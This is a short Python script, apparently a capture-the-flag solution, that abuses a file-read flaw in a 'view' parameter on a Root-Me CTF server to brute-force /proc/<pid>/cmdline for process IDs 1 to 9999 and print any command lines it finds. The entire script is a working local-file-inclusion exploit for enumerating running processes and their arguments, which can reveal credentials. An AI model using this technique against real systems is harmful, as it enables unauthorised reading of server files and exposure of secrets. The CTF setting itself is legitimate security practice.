
import requests
import time
from bs4 import BeautifulSoup

s = requests.Session()
url = "http://ctf10k.root-me.org:6002/?view=/proc/"
not_found_length = 1366

for i in range(1, 9999):
    print("Getting : " + str(i))
    req = s.get(url+str(i)+"/cmdline").content
    if len(req) != not_found_length:
        print("[+] Found for "+str(i))
        cmd = BeautifulSoup(req).find("main")
        print(cmd)
    time.sleep(0.1)